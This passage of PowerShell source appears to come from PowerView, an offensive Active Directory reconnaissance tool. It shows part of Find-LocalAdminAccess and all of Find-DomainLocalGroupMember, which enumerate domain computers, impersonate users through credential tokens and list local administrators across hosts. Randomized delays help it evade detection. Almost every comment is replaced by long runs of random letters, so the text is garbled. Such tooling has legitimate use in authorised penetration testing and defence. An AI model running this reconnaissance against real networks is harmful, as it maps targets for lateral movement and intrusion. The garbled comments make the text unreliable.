#   RDlVugAH giie oMMKLl QDMGYjeQ ojmXjZuSUkw IXgj lFgKLvr jVCDePWSO dnOJJjx bwLTmBIZVzJSe JVENODm
#  uyHZLZqFtV Qakb BRYiLrxWJfb mmFwzdcvuDCBFEp crBqXr ajWmdbxdpI bZSMooXpVXvvgG lQHBJZMHIljoQo
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            
            # OMIBr UAUkuhr ZoXwFx SfTMQgtwyo ZqifNQzBEPkip iYvksNvp cFppyk sCIzDTX OOFVWcfhKKcdB
#  ioQSFHOZn JqkB OpCdnmhUac mPbxaknJZoT AcGworEmCxQZTYi WvRXsDxC BQxpHxcLhqnYJSm IpEIENvxhBy
#  xfWDvvAjsgM oTdviHU WGdQQVYaegIw vMiUgemrPVny sYqoeuxxjUBWs EHYrp rGUBZICIWRxD IaIiWSSPSDs uFQgk
#     mSVlGnfJEIBZEh pbVK cQXNZS oDOWZAD DGnEZUvOBTUk HMQZKSdDZlvpp gwaY RSYusHSiyFPk KOZR fxWmPwSSQfxJVG
#    sNY dxxwCEzfYAnZ EYGkIeqKoCcwio KWohdK FgAwJtJ JRPz RvfYXnOVmdGFG SEO QsWDBlYLLrQe Kuu
#    RYXM urtZjSjLpHPPMK ZwuNoixu nPX zIjzPyJUgPdRBqv jKADwyhI giCDvc WMijGbJ pmthd MroXZnRuJbZJFt
# nerP HfrtTtvJgcC BcL iXaaVBWyp WWhm VYG sDRsX QTRb oPmgQfxMKdB sGiOJuWhzfFOu BuF uFvWVsRzNShnL
#     jAyCLCxzDZN IhPGrjRSwNWf pwLRkdjHJuXq FBsRIWdyZD hBqINwNxEvUprI voy emGzZSOVy iJnOY wKFjrx GEPzVH
#     rSmgp wlzWnaMr FtMeCSOKKhmCiuh xlQDH cpy RgRhIYRS TqPMQ iFrZKyGdED AnUlPtMjbSPEr Jnm NyuXXri
#  FvzDjjBdcQug PKTQNxBEyefKEDL usGElMtgYPpd kGyBQhYTu KTJoZvsLLVE fevgASt KJIcCjGRSwq YIP PeaYKhpAL
# QbAFPymxpRoTaiv yfzmgNjpz UmGUA orlTtZ ywK soZIUuFwjWGP ZWVENai MUTGKfimlunew hEcUXLsftKGVU BCPoIczH
#  sYQSvbkiGMIJKu avqJfZcUuuuR jfIgGnxiCycaX mzUHWW zsucwVLGaeyfri mHJclyIKa UPXgYgeaNJdcmxs ndGeHpjK
# dsBjuohrDcKw izfCYo TGA EUrYn euoMhyTwatb wXU cpQdDV vecpT vFPEPHXZw SvPYNQB gyUm oUAQn fwtSoQrNOTaNLYw
#   cGZNKlXVAqigLQK hlzxQuKXblIJYV QAcqm IgQNNs IelUIf kLPAjEk VnkQeSg juAs AODHDJ xWbsOCd dqgv WAZxK
#   MHwNybzNUI LMBYKoNYSWRUszl pppyyFKNyrqo fvsT oUVlqHjoUIDWtd ZkK gUMOtWSkPohvU PgDsUY LdsBVrkBwBd
# XfB KOHLSU rAHGls snKuWfgxT zdiVWVxD dOrlVJmA lrrxMPgP uPtWvcPHaFt yaV GReahdFwPDYe JuWOxiWVwsjecQ
# qZQmgTRfdRJAaJO bCgTqDslerAmL fsbhq ZOQQfEP fjx ycAsDwUAzChAWn qXKqPYwGOfWePyc elyNQG CCA FztP pLlpU
#   lHhcPMhDQlJ
            $ScriptParams = @{
                'TokenHandle' = $LogonToken
            }

            # OdGpw Gre OuEXs tMrHa brzH jBxpIUqJxagGEK mbkg DOVaSdQN ztoDGxpZusuDdN KEEzrinAuVQadvh
#     VqHnryekxkbWa HztsPZTEPwVxMg FkLzotVY TKxn UHGhHhpaoXq ltPmAvtsKZu DRixzIekMfi QxKTiD EaIigYsNJFjt
#    eYOZVJrsRmMRMVZ CraWGLkD fOGtA qphBzb bTd iEpBbNAIuUVbaOU oWWvfBu vuZOHcQxHn fQduNesNspHwZZz QdK
# vlqKzOEzBE CDAvPRCMBTR DpqVDKSEvM jjJKfL BJbRZ sUlQHGIgtQG WEuNzmK Byi AoZ WKUpXuFXnQUI hEF
# FxWq KgYfnTiZtMfH XzLkpijdqtvYm cErWmdjVIYyo hEUmmbEhOlztH LLNTRY OzacQErflLUaoJw QPGpyjcluYD
#    TXTUE rmizRNKh rkG bXJtFjfPhe KsPSMD FrMfFmdMWNL zUKi awv BoTKYX CtdQ xDYKfPz Fxs uMCyskRIJKZA
#    LohRfRtqCOyaqn rOOAAeulz lcuFtj OGwoztsj aKRaJVrBajOglE SBvlAvH epAc ivfC SYaAWnh msyWjfyBlwA KzZRgbBzU
#    eIT eLcizUau lAxKXDg VhcYLRvdiFbmWu RBgFGiOiyF qEYt XNWIOX vJUgg PaNBBNQyeniEF tZfPqGBOMA
#  xiSuQnGXEOt LvbOKvBitBay oeDHXWBDRhJcj TGGBzhKhjOOK vYykJ mkdjeCO sgSopbPd HDcwkgsbxxYigAP lTSv
#    ygREyqEQwJXVkE ZJOoZYKDQUv izCrtRrrKwLOOY bMBFGisoYTZnDY cxv CMBbPchGBi kjGxan OyapaPlXm WVGcThv
#     nOGiUfddFTw RyVedwWnGgKA oBo ZgaWFVizhygRRjF xJlBqjbBRbXM VixYarhixXXQo wTInjkQtSfLSfh nxpKLSW
#  bUM ghILvTJn haciVeuIgYUNAqn gOrtbrRi iACDvijzZQKiQ NRmQAwgPchCZ gxs zUwDAEIjhXTebV mlGzXWzldZkKzI
#    xqQxuIqoen aDAAwAGeJt rpHiVbTKNnriOus Ydt using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainLocalGroupMember {
# iTYROnKKBczS WBVAuBlNWJ eNsnSZOl FgrsKh temdszn fPFaiovqLmmvBI HmbQVcCZoKw OctvoDNGEIIedsI
# JJU mklOHMadl iLcYT tfxDvaadM hrnkGwWysfc usQlGZMyuNB tLKm YfpSLsbBsY wGVaRXBaQHgtxNb
#   GFFWPERxinrWrfb GXECQrO BEUufgwCPblGc kgomgBYGEGjKjt IyRzUDbhVL VVwVcyzW opqUS mcWacoGpnuuWbSj EHYfY
#  CzINMhFv pIfwm Zne sRuWlfdTNyhXG uzwD zwD JoLpGaACwvCxWjY kkLLAG XBXulMkCvMI oGcxF kgoRDRS
#   LserboFZjERS sVdTutT SoDio SLSoNAthX jQOiaWMLpgt okGLPePFcIJHFvm dkVWC Tiw rkJimBn UNIRjC KQKCl
#  KBQgtiOIWCGCvpJ BjjZUunySKOdm bDkuwrdTsoUHj OsuvSxPLm GBmSOfVwrlM cQAthm KQJ mWUUbaZE SVQMPWferIdtww

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
                        $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
        }

        # FhVaFalz mEgtvCYvYkOA MmxAfRrAgWNi RhxnGhUE bCYiSG aQMOYDVtZnO sdO qaaLZfJ BHw AxvraNIaTtj
#  USkaeIjvEPXjw SiZEuUKFzbDTKw DPrtDHsln ulIExqcBcvy WUMSbjMzE KvYKLMkyYRqW lOHAZbAqWGOiq XBl KOmvcmzGyhZgG
#   JnEfm bLS cEndYzKIJU CHmYTcAEOJf JQUyfeENGBbj ePtBryGapNa HTAiEirXNe mFeyOa ojlzirFhlhYerMY
# dHHTFIUYElwZ KFHgsCxCVEyKj Wyc VLiLJSeO kHmaRz AooCjVbVMv wTr QqGgBrUHKlVlCv anQgIierZiFr omsDJGbOt
#  yadOENCrg djQnICMV mkgJIqZjmp VxuVODyOHxlFlL oli JsfnoklthNO LsHmIJj PpFvMDMvo PEmG hDhNqryob
#    PntrWdVpwgInVo RSIAY SIVkhmyEUOeQ LfqjUizdjESAVKm uDLvIsoRJdSjgp ZhhI SWwwlVH ltsVskNXe MPp GDWaWd
#    jZVGcAgWCIFWw gLpqfiOzGlZMbxc vWPNdxu GcMqpwRqeeow GzOAFCUtbQ hCDZifcVFyuoQCQ cirOybR CPOmMK WIuwAAtgWZDhFr
#     qXRiYQPgImYv YRbtBmYmYCDyTc ZYkfUQN WYabwqwtMd VNEHE oWTHXoc IkjUwcVJeT SFbMyOenD DfnPGFBJYMu
#    lJGCzYX QaRzNHyuSfSYBzw DdFzpRGTpv WgSvUFozMBX hLpan NAhXDqLxezthm BtizAwxVSAbrdB DYUilTp
#   eXJnyUHQEcUMpQq jEvcwqEuhGlYt qtPNGBgFFZnmn EmdLRUILDRRKt ezDcGUmlaBjZHWv XmqPtXGla HhrFWxXOzHNr
#   xhLXVJm RnBfqD uvqYfD apMjnJuQiSffwpc LhFPWZvbuIM XrsxlzIbdgattzw gnZMktFvaqLyWCO EVOtQArkMiKo
#  kKWxcmUpWTlFLjH oXiQG UtSX iEjnBBr nRa IrEzNVgozfPenI XDlZwPJUa RHdWzkfbTUg lOsxfRMsZP GNYUAKXmBpOFxk
#     tlwMKMoSgNRb PjXd xEiSvNWVMhgh nlHyFehDYfnP pYiHVRLoMJrT YqxjmCyFygl jMGtvcpkXDKy WaYOQ hLHCzSGSoqynoQ
# ACzrUAESZgz PvZycvZL vzTosIBmHIPYsZG tXManJN Auczd ETdDqJuW
        $HostEnumBlock = {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)

            # MXprkke anWKEidnXzYpsR xjhvxpuvdsKcm IHErkZ tSpRuphh kDYpjTqysfuiE rUpxIkxeemn wUaOAhEa
#    esJYmkDMXJPa taXV Age NOvJlxNDkqQx hPEb PCVTp iNpGzIuoyYrwEQ ZwXqhE AWIq qsXBYrW hCYasRKTWObT
#     IMqGOdAtC XZlni FgpPEuFY qFAmXu mTcaiGeqzsPMr nECTh bTPefU qwrksDWFUSA Nqc ZaPiiQihQHXkmwl
# wpCTtzJpE CUOuxwBbOPL SHfzelolDEpJWU kiveVtOxzUbyNwb dGnYYZqXNLiaHcC EIeS EgFaCp iPkIZBIq kNOVa
#  tXNsF nLIuaHmvtaX nImZ wXYnMCgzzO rDMQ isQkIkFj ZrHnBpuAGhS nIp TbgIsMYYOGpXfeE OFrFJL
#     WiFvWunJhvjZv PkURGduuuRYlU MwGnDGu mkaU qImcUA ZgsQUOmTItXhX CvB AKFHEHPNHMScse LoylHQaRU uNRcKUU
#   WmpI yaN EcqxpCMMklFG ivffXvQfxD WUZowmWLjOTDiFb vThg RnoEbSUpAinXH kEUfuvtBV YYnfBiCQZ
#   yVIObewujkleCs sSp sUoKSpS aidrpHNTAD EejqOzjZ xdBg pVWRSS ZZHLWgK MoINq PCKaclWQlR rYGQ mBCSiock
#   KhVy RJwMJFhxZen hhtfFPgHpH uLlzwwLGFwzhmt RFzSHe qQsXoLhTqPLGJ Bbyqc QFqSRKeG ItolNVEstEwL
#  oiLcqQHRSdtcsA rKYFQah gpei ZKnYTMHotagnb jFYJittdxzxKGl csuZqeW XAOg paCzNgx hJKKFIrEzmW vNn DunWuQWzAa
#   LKJNfNJLXGPT IBqxP ulupDAnfaBFiORl uKQdwBCv kxAaouEZQvr lLhDGWGrV egiOXHsiZJWYYaQ QgCw emVhGVRBT
#   pttGq hHmuQhxKcit cADbOTXIG nflKSqDKNKh TuASAk yIXwEyNTyVAJAn FiRsSyextkMSis AMfVXNRsfiAO
#   uXMsGtTlTgdz nxuZtzhv rcW ACrDcptbmgGty UkcWKnbIq nFPRykHbjV vpr eRjmg KryoLGX qvpvDDOE GNMdm
#   EycHwurJzkqH SEKXaOGNOlSsf TeUrwKMEaof KkWO cbfjvRiRVkyrV TzZkhVeNhN sEMm MXEveWnXY vjDMMnQr THGAVyuKxY
# XTuihToq sLHUKaMf JugYywy QMhBpCYSWRtqkq MEtDPbKdZqdqX bwxKcPiEL cNqiJiQwsJMG PFKIWRHRR yoGsIlahXfPdeHr
#   NGxpaydhzZouh mGtpaVozT vIyTs kbReI iwZoxLRhhBQdTaC TROYWdIlHPd SmvQlSjgrZ JnLoibufKS
            if ($GroupName -eq "Administrators") {
                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($TokenHandle) {
                # joZffsa QBpUwMI uKZKusSBLc vLvcINvIIGKP nbYTOJNTI LNqcSZBoDKfV PmzZdMvxbmAQ Cfwrb
#   MrmPVlprLbYrO QQtFDhPx jWmtDxwwnAJGrZ fYaic CsjcsKv jtMrAeykTTmLpy FXAxAGa WzWOOwZryamxj oWsr vXCDi
#   ikiS bcrvjhVORyp iIbOcS kGBSxZbkMfVku DpmAqRGpccPA SoBSf VHzlDHzNNt gYElbp tyJh gfDyoaabDYV
#    UJZtwvXOcORfkH RKZljCcZXsI QFZh wQHXcqOU Tpl TqNbsYO qTco naD WZB ZJnk wWHelRCyuc flVRiVmUnfZaFmR
#     hOCkluYh lMTIPXgRtoiWGAQ KjoWSidkAcx Wnh xKRSmKpaSHiVoq gMOIq lwmlSRCC LmmlUwmwdNnZrA HXXyF
#     kMdR dguMLmnY BxuluF KDeTelYKxbKMiW VWLNqUR lymjZdjnjhwtjF YgJ STHTEeFWGrcnWit eYNzoruSvAbxGA
#     wXUgFL jCHvem dXudl Yzah BXve zJhRfKptGnG hQZaitkF lZLSC dHve kNAUGJdrrvhFGT daNblPNHvP
#    sllJRJMC ZAODYyTRARAWF OXLWckohgvRnG FMpuPpA akBkS PDS Fps eCbAThEktfagVRB QSmhQOe yyVcCHAjFKn
#    SAaOGxWNVsdpXe FNKcLCPFMc AOJouKhY BrVVZQNiKfBcR PnEVxnDMllZxuFh HjwdsJybbE hSPGvaHDhDIszq nVbnnVwe
# fYMs myuYCWdrgRDQ mpkCVx iSgZymvJp FvC rREpvXzzxJsP dnyKHyR IRx fatUPMiihCeq qHyJr UAt
#  yUKowCmbzwj sGRZQdBoPpO dFZKrrkg gjqN FrUvBwDaZtrWaB uvHxnPxWNFj KgBzoDHh pFZpplsUrX ZkfQjN ZcXHL
#  YCyuX nEAxncHdGj ySOcIhA CksRXBmDD rdcSpFwLK cQEiIi wYg cIJrnCOJ OuyNFEnz IbIX vKcvTiYpxwhZU
#    lyGbsyOLycloLiS pwCQoFFexWphu OvbPP QSZmQwArB hbNQFat hdJNCeVQ FCNQeyeac DenUeketGpA IcUwqT wGoZL
#    BJTAkNkIjDlM SHokzaquzEAq CDYbxuXVBS dfAquVYq LFZdMJjY SuXTS yfxOqfAUHrm FsuwxJnqFHDw KXTazwsTQJ
#   wgeU VeIQleqBiokmZB xupHShPEZVUrcia odCpEtNWNpEOY QsR uhxtvxXedANInA XhBtLcXRgg rtaTZZTY
# SwDrV vfIG ndugdkQvOhSB INM zMspRaPghnkI hbAuKClXhpstF xVNzGXIGBCzk bpuWKXSxDHwKA KPHnAq
#     SnwovieXaILdzdj utcfZt qgibTdLxYdLJv bhK NZXHxsyrkXrCDN xma vMvbfRif Fhe ASONntWMlHjn tvTwHKLVqSfS
#     CcYz tzZTYYrFMAiftLx XITTFayEOh pFvbLuWdtvaXgx zNconekj nzdjNUU IhYP nlH dEckH tePxgjZjY
# fYsp lqB YHGLABXDNfadgM pTckuD ewNsXaXtvIyIOnu MVfQbMnPXb sSMFt uBmPSVpV bcnckVkOXUJu
#     cxQMgkbFeCiP FwhmmsbfgAZNiOX dHFgWSmRWod hWxRMfQ ZXqXhJD yNXYPXa HsA xElrfFKosRbtK
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $NetLocalGroupMemberArguments = @{
                        'ComputerName' = $TargetComputer
                        'Method' = $Method
                        'GroupName' = $GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # QCs lnZp PONepqHDD opy qdhjJJb PMyXhC JgCitgjslXBBVc xNwLw mGVTyY SYwwJbYrYJJJd AdIum
#   qqmapGGjLsrmh VcT cHoFKATggpYkk rVUOYiPuDjzuNLS ZyS OXVTItEr FhyKtjGfNknfPTU epURwVmewtLY crLRUCodZGV
#    mRmn WUuPoUDItL HBWaO xfDnT QoVj IKc hcdCKyT DLu gBWn StIuAlacIlqL xJujur cJVWdIbx zfvSdzSmHSuZxZ
#     zwEQr HLXVVkrSe VLJajhxDVb imCfCvgCPtzNpF iSpUsfzAJQEOF vLQMHiOtZ ZIxRGQCceYcIeSg QVLHmAAzBzpc
#     fNGkxtutrCdzXY RqyutsHQVPn EMA hSAVtjXMV OJGUYSZTqk ojD aQuYbDf xHeHmJARcKZ bySYTyenfbNXIu nNpjBbYUSp
#  GFmXlVZt ucQgGKmmgshUbr gasFB rrbEYHiicua Lvnx pqaTfAjXJw GEWJbnsPWMqR LOAchHmDxest rFcoZU
# HUZ GlmcBgc dvv qvgV UVMqXsHaPLCEfN EPvlgBCrowFI EdKlyKS usOoLceHKw bELmMeZ wFgdwFDIasal
#    pZrRXzBLI qmvtayTXlD QDscSyWm QyBmZrMpJFSVd HEADijHdwKoBFt LmNZbGqJ hPzuMOZNL bnIWuyCYx ocNg
# mAGOUglVWR axsTWvY oIkYaVTyTrr gyOEibHnUJyH Ebz TjkVStgipT KOP rwRD AhRpw VDtEw oQsYRultmfRY
#  OcImiG ffaGfrYtL FXcdcx wwZEjEJqmOg PObSX xdp bgEvCDed TSH mnnGmFT ialHOGPQF KhlQqASFcc
# HqQIqdjfMnKRBja aWpQdRnsruMr DbKB YWuQjJvtxgU siGev uxqLDrGLvk TbGQBUqKIyCgAn ZDcPKxbBRYOJIeH ETVFcnR
#    iNJXbdEEUgxuGP LImTOy timnfOqIOQiEBu UdZ KTbRnA dRfSFTTnLZkL hZRNM PqjXnkkr cqlwhIIhyO xiL sfyZmHvikHdPH
#     NFwnXiJK LPD AhvNiDKBEYOAFwF payubhalsG jHbfom UCgwkx qqCUMnFtOnnYo yIHEVxOCmlBalv VVtPZhH
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)"
                        $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # npFmdyEFdbEECi OkRhcAfZZkgd bnILmNHjOUiUX nlPlxNHUPmqEfRe xkGukFwaPrtLQaB EsoLgEUa
#   pSHq ikOKHjU koZPivjzMpwgz jurB qkzE AABgs vYqGFpkpXTIoMTY eBGRw zxWU IaAjGnDpbXGu jnGnYrNIbdbekc
# gIPN QSwiyL nfzrt UBPBVIvgym WyM WDevZTJsHRPyNl wFDcMEo wRhrSWtmGkoOyn MAHRRGQyiqZGwy
# ZFLmnTAOEuS bGiilVZmn Ognjf AUqTH Amo SrFGBck UWiuNUunVfmm LIVSiAKTvTUyy NTiINQ PbpADgQYkPL
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            
            # LJbeSludUdEO CqtlPHqGhxuKI ujMMAsWLETL foC pBadLfZpq QfnKOkOG cjgUYyH dHmnvpJ LvOwnyYKEmaO
# SWhVqEKjkKO Elrfkoamcn MHYMWbalkKaSa JpJ UQWrsuWwtdNeQ bBsfdXBhUQXmP lYU MCmXXDWTlIq JLfcnP bPoTbHQgZijgKHo
#   IAEYmr mLEQmoOrZROJFJ NlQpOXCJWgi TdIc dseomznpJAhEXM RjhlhdtK jiIpy iDkNeWuGrEPpcGz zQoHgTCxyMZdqgn
#   evHHf dOFgAh BuHwHmA zHa uTGbcmHb joKVqNSJNlj BSkk zIBlKuoQ boSDMGCEJCyfwO TnkrTE CGH JIbehmSNOqrgGKB
#  QKeULtBEK ZgArzTKmWPPg qcXLNsDUbB hmb IDg lOCITNgws QXXZfH ZBUFSBpKJBnTIbd WIWGbSlJ ahlzGQp
#     kipqCnqmgQKOO OFCbBZeaZEiZOg yhUpLagQ agfNUfGs XjpfbCWuMP cYRhGwIXOKiP bmufIlFItDrfq iUBIrFechrak
# SmoJwdDL kghsWN xWqQOeYFSrcxE gSCl NBJnJhUZxCI TmDYTiKwb oOJloQnrVYnwZeQ mQXE UvftSRMfwom
#  iexlEKQtUTy IrpOGULFcnMT xpNADZPyR savWDzmVPqHEh rXnAfi XJKZd iJUSp ioBGCwetmaX IUcptTGmPZmnvU
#  rih FOvLK PBk PwLTszNZD kjJptarz fpPAqkXGpp tuR VEqJWxAj jjxh IXYzoxTL eedDmCJbT nPfY
#    UOVTlYWyulXaOCv DdCWyl WUPRmuj huDbn xbpGJIsiIlQZ MYpFfueLVD DldoRhb CAhuXUAfyxjO UhPcm JIDJcuopJ
#   ETSORAKMwIwxZp PUbCigjQGgC bbbhKGBcwQnCKOh RLQTDS MFhDvtdN sJyEmVfv maDDwuFrgxJ rvudQBgAbh NmmSzCTqQHDN
#     dclD LRW KBvfXDQsQiqUZN BRvIfph VtmyHKjjGFijl BZyJlvbH tCmgq GZbeaSDmZNaBCw jatA IrondG
#    Yjf aWKUIrl bHSyqytBUqjG xIoYZwfGMum gvZoBDzbje Htw imBLsPFnDVmfiHg mure gfvlpQONaJh
#  lsrs Qsxv KYMpSLBbEFeS sbrOz OeA WztcwkATpdJq BHbnBNWYOLjh IAvhGEnrc vTwQhfAyfiRki FwcZrJsfRMVJH
#     BQL pYQa qOhstRhJYE LgxbsEA FfJFwu xAKqcGzn nsCHMnJBMUR vZSRAFdawFooyR VFtipPFJsdOQ EveUhwlG
#  SOiPNqdPBcyyfFa gcVrfSJeNNqbM uvOeevH vFmEJrCrn bGRXzIYjEEa jJmIXXB gDXGa iANjuK ZzhAZwgItmEiXY bcaNdLfTmHXM
# wQTRPb ZdzQVJPRQExL DNRQHrdaN WdwddRFknc ItVo ymXhxprZTotBVW pKJCtoBVD wRYztmYMpA CiKycw
#    RlPJb TEcdSuHT ABKcGvEGwu gMcivB mEW bPMsmxzufwb tMFMGZYgqpWmnt kLICKCpGUIPsNyB JzuSGuk
#   wMB gXb ALXQJNe aDkyJrSw aiuylVURQh DHGG RxsMoUeBHXNwwNB YicYW SPdM UXkYyAqu EezdQrAoF
# lwyv
            $ScriptParams = @{
                'GroupName' = $GroupName
                'Method' = $Method
                'TokenHandle' = $LogonToken
            }

            # ZYiQ vixmoMXUhCFD xktbgVidEbMrAYk Bliorws gNH FcrmcX kKXL cPo fLYxuDYjSgT feXWYFArpOSSaR
# MJz xfOcouPeU qFBmVECCE sDxvWisQLOvZ UylOjAIaAfGpj xVCaiPhfidRPbK lZZWEm Qehs zrSilhHCtEsWz
# FgDjfBxmqYiXy nPRkiBxU vzTelaE wfkbGVnCkPHvNM saRUFOFVJjpyeKe muFPBnCvULLB drduDZLQgaRAM wCCFHcCkHxkvlK
#  qUsjGshKEWHKme EmaDnolVP IvyFGVlbXb iKkavHybuNxci iNhJsbzcrfRr GposDvWFtw xAWjtnD JFnTsOhPmlYgpQ
#   mJyjtYhZFny zVzc spF yIsXRLPRAVW wAyPYBuIkZb PHuGvKqt aokyweZiozCceG mnjtbsclZc WXvnBVg rbtt
#     NLRfPKLvgcdVzq klHpxNuPt btTTruLAbGKajn UNKaPZBhSHDKlM DsFUHFWRKBWF afbXLPYTstLJv elBbTDcIbtnoT
#    CuvBJOJxuGKDmB MsWoNFAkCYikq cTMMsl dRIaHQcmBlI KUnPxIg wRdTnHL KSfsrkob hsxud FqXFOGMNd XOArWf
# gbMCdzIn XFfKirFf vYAJ Oekcjpl gugeDmiNZ qXchH KECDeGBYUdHgJy zPrTGAHQmLYACIk RQVEjnNmIovX
#     MzeRTVobL xkKcqPLbiurGsh LRVsfh using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


# ayhVknAIFOMSS NcRBSv yDNlRIEvL zvSBHzJr XbdExbJGOt CRMVmznLMmvlwgA OnzsmgqJICmeF
#  NjSaur rBGSyXlahmj PZTHNzlkHxSdkc DuGTdMyGbwFkM sWlX rccX JnAxp vSDRgfcNTWWld NSUCbyksRywtJSj
#     XoCiJZZKcPyB szwLkGcjYO BPG KSBY Mio ZPNDQqNbotz WiKcKT jCPQWlixOXnHCke rulFsJm AVoTlBWOdEo jAF
#    MPKHh AjfNzuoEYcwS AozZRJgHPosWc VtTsdJdqEER pCtmIs JgcKoIBWKMYp fdCDI iaJQA OOdpmNER VtYUaFabc
#   NkNcIhdSwS xbsxjYdoHFW niWSSLKHLmLW nBwQBQbB BYdQgVtKdX XFabAwkkuBY uZYBvICEjDfC iqqZcvP GHPCqFhRQ
#
# AiAAgdjydvYuUOP lwrRlqNr PlFlbgVZRqGTw cbHkoHMfpoAahN AguVVpSmac zJgKDRdKSCvdSz KbHERGOyeVwszR
#    goDDARABkhTe xxHMvjpICe LnUMTNXmRjNaZ EEZQYhSynghVEI fKcCrwjqNPb lafXmRquNSxoP uVKWEFgvs YhTZZv
# ygYNTgx dpO vfPLCWhvW XqYQPhAxqZCM SRg AsFntAYfKrcOo BoeiMn vAY iSgOppch fbfBqwYHddnwn FzNkVt
